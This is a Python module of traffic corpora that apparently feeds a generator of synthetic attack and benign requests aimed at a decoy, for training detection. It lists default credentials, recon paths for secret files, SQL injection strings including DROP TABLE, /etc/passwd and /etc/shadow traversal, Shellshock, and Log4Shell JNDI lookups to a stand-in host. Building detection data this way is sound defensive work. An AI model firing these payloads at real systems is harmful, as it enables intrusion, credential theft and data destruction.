"""Corpora the generators draw from.

Deliberately varied so the model learns behaviour, not one machine: many source
addresses (see ``sources``), a spread of user-agents per class, and wordlists big
enough that a bruteforce session clears the rule thresholds (>=20 attempts,
>=10 distinct passwords) without every campaign looking identical.

Everything here is inert bait aimed at a decoy that touches no database and
executes nothing. The SQLi / traversal strings exist to be *recorded* as training
data — the decoy answers all of them with a canned failure.
"""

from __future__ import annotations

# --- identities -------------------------------------------------------------

USERNAMES = [
    "admin", "administrator", "root", "user", "test", "guest", "oracle",
    "postgres", "www-data", "webmaster", "support", "info", "backup", "manager",
    "sysadmin", "operator", "ftpuser", "mysql", "tomcat", "jenkins",
]

# Short but > 10 distinct, so any campaign that walks the whole list trips the
# credential-bruteforce rule. Ordered roughly by real-world frequency.
PASSWORDS = [
    "123456", "password", "admin", "12345678", "qwerty", "123456789", "letmein",
    "password1", "root", "toor", "changeme", "welcome", "P@ssw0rd", "admin123",
    "iloveyou", "monkey", "dragon", "sunshine", "master", "hunter2", "1q2w3e4r",
    "qwerty123", "login", "abc123", "football", "000000", "trustno1", "passw0rd",
]

# --- recon: paths a scanner walks ------------------------------------------

RECON_PATHS = [
    "/", "/robots.txt", "/sitemap.xml", "/.env", "/.git/config", "/.git/HEAD",
    "/admin", "/administrator", "/wp-login.php", "/wp-admin", "/phpmyadmin",
    "/pma", "/server-status", "/.well-known/security.txt", "/backup/",
    "/backup.zip", "/db_dump.sql", "/config.php", "/config.php.bak", "/.htaccess",
    "/.htpasswd", "/api", "/api/v1", "/api/v1/auth", "/actuator", "/actuator/env",
    "/actuator/health", "/console", "/manager/html", "/cgi-bin/", "/shell.php",
    "/info.php", "/phpinfo.php", "/xmlrpc.php", "/vendor/phpunit/phpunit/",
    "/.vscode/sftp.json", "/wp-config.php.bak", "/internal/api-keys.json",
    "/owa/", "/autodiscover/autodiscover.xml", "/solr/", "/jenkins/",
]

# --- web exploit payloads ---------------------------------------------------

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT username, password FROM users --",
    "1' UNION ALL SELECT NULL,NULL,NULL --",
    "'; DROP TABLE users; --",
    "' OR SLEEP(5) --",
    "' AND BENCHMARK(1000000,MD5(1)) --",
    "1 OR 1=1",
    "') OR ('1'='1",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "../../../../etc/shadow",
    "....//....//....//etc/passwd",
    "/var/www/../../etc/passwd",
]

# Injected via header or query; the decoy just records the raw string.
EXPLOIT_HEADER_PAYLOADS = [
    ("User-Agent", "${jndi:ldap://198.51.100.200:1389/a}"),          # Log4Shell
    ("User-Agent", "() { :; }; echo vulnerable"),                     # Shellshock
    ("Referer", "${jndi:dns://198.51.100.200/x}"),
    ("X-Api-Version", "${jndi:rmi://198.51.100.200:1099/b}"),
]

# --- benign traffic ---------------------------------------------------------

BENIGN_PATHS = [
    "/", "/robots.txt", "/sitemap.xml", "/favicon.ico", "/about", "/contact",
    "/blog", "/blog/hello-world", "/products", "/pricing", "/login",
]

BENIGN_SEARCH_TERMS = [
    "laptop", "running shoes", "how to bake bread", "weather today",
    "python tutorial", "best coffee near me", "wireless headphones",
    "office chair", "annual report 2025", "contact support",
]

# --- user agents by flavour -------------------------------------------------

UA_SCANNER = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Nikto/2.5.0",
    "gobuster/3.6",
    "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))",
    "masscan/1.3",
    "WPScan v3.8.25 (https://wpscan.com/)",
]

UA_TOOL = [
    "python-requests/2.31.0",
    "curl/8.5.0",
    "Go-http-client/1.1",
    "Wget/1.21.4",
]

UA_EXPLOIT = [
    "sqlmap/1.8#stable (https://sqlmap.org)",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120",
]

UA_BROWSER = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
        "Version/17.2 Safari/605.1.15"
    ),
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]

UA_CRAWLER = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)",
]
